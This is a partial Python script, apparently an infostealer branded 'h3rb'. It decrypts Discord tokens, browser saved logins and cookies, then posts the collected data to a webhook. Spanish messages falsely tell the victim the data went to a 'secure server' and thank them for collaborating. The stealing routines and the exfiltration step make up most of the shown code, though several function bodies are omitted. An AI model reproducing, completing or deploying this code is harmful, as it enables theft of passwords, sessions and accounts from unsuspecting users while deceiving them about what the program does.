...
version = '6.1 | The time Update'

banner = fade.brazil(f'''
 █████       ████████            █████    
░░███       ███░░░░███          ░░███     
 ░███████  ░░░    ░███ ████████  ░███████ 
 ░███░░███    ██████░ ░░███░░███ ░███░░███
...
print(f'{Fore.BLUE}[@] {Fore.RESET}Programa Iniciado.')
print(f'{Fore.BLUE}[@] {Fore.RESET}Timpo Aproximado: 4s\n')
...
def get_tokens(path):
    ...
    if os.path.exists(loc_state):
        ...
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')
                                    [1]), b64decode(key)[5:])]
...
def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(
            path), Cookies(path), browser)
    else:
        with open(fileInfo, "a") as f:
            f.write(f"{browser} +  not installed\n")
...
def post_to(file):
    ...
    if webhook_url == "":  # don't change
        ...
        print(f'{Fore.GREEN}[+] {Fore.RESET}Datos enviados a servidor seguro.')
...
print(f'{Fore.RED}[?] {Fore.RESET}Gracias por colaborar con h3rb.')
main()
